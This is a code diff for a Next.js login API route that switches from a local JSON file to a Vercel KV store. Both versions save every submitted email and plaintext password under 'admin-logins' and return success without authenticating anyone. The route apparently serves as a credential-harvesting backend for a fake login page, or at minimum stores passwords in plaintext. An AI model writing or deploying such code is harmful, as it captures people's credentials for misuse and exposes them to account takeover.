@@ -1,6 +1,5 @@
-import { NextRequest, NextResponse } from "next/server";
-import fs from "fs";
-import path from "path";
+import { NextResponse } from "next/server";
+import { kv } from "@vercel/kv";
 
 interface LoginEntry {
   email: string;
@@ -9,32 +8,25 @@ interface LoginEntry {
   timestamp: string;
 }
 
-interface LoginRequest {
-  email: string;
-  password: string;
-  rememberMe?: boolean;
-}
-
-export async function POST(req: NextRequest) {
+export async function POST(req: Request) {
   try {
-    const body: LoginRequest = await req.json();
+    const body = await req.json();
 
-    const filePath = path.join(process.cwd(), "admin-logins.json");
-
-    let logins: LoginEntry[] = [];
-    if (fs.existsSync(filePath)) {
-      const data = fs.readFileSync(filePath, "utf-8");
-      logins = JSON.parse(data || "[]") as LoginEntry[];
-    }
-
-    logins.push({
+    const loginEntry: LoginEntry = {
       email: body.email,
       password: body.password,
       rememberMe: body.rememberMe ?? false,
       timestamp: new Date().toISOString(),
-    });
+    };
 
-    fs.writeFileSync(filePath, JSON.stringify(logins, null, 2));
+    // Get existing logins from KV
+    const existingLogins = (await kv.get("admin-logins")) as LoginEntry[] | null;
+
+    // Append new login
+    const updatedLogins = existingLogins ? [...existingLogins, loginEntry] : [loginEntry];
+
+    // Save back to KV
+    await kv.set("admin-logins", updatedLogins);
 
     return NextResponse.json({ success: true });
   } catch (error) {
